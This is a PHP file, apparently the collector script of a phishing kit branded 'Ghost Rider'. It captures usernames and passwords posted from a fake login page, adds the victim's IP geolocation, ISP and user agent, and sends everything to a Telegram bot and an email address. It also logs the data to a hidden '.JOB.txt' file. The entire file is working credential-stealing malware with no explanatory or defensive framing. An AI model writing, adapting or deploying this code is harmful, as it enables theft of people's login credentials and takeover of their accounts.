<?php
	
	header("Access-Control-Allow-Origin: *");
	$email = $_POST['username'];
	$passwd = $_POST['password'];
	require_once('../Email.php');
	
	
	
	if($email != null && $passwd != null){
	$ip = getenv("REMOTE_ADDR");
	$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
	$useragent = $_SERVER['HTTP_USER_AGENT'];

    $message = "";
    $message .= "---|Ghost Rider| other l---\n";
    $message .= "Email: " .$email. "\n"; 
    $message .= "Password: " .$passwd. "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "Client IP: ".$ip."\n";
    $message .= "City: ".$query['city']."\n";
    $message .= "State: ".$query['regionName']."\n";
    $message .= "Country: ".$query['country']."\n";
    $message .= "ISP: ".$query['isp']."\n";
    $message .= "User Agent : ".$useragent."\n";
    $message .= "|--------------- | Ghost Rider l-------------------|\n";
	
	file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
	$handle = fopen(".JOB.txt", "a");
	fwrite($handle, $message);
	fclose($handle);

	$subject = "other";
	$headers = "From: Result@cok.com";

	{
	mail("$send",$subject,$message,$headers);
	}
	}
?>

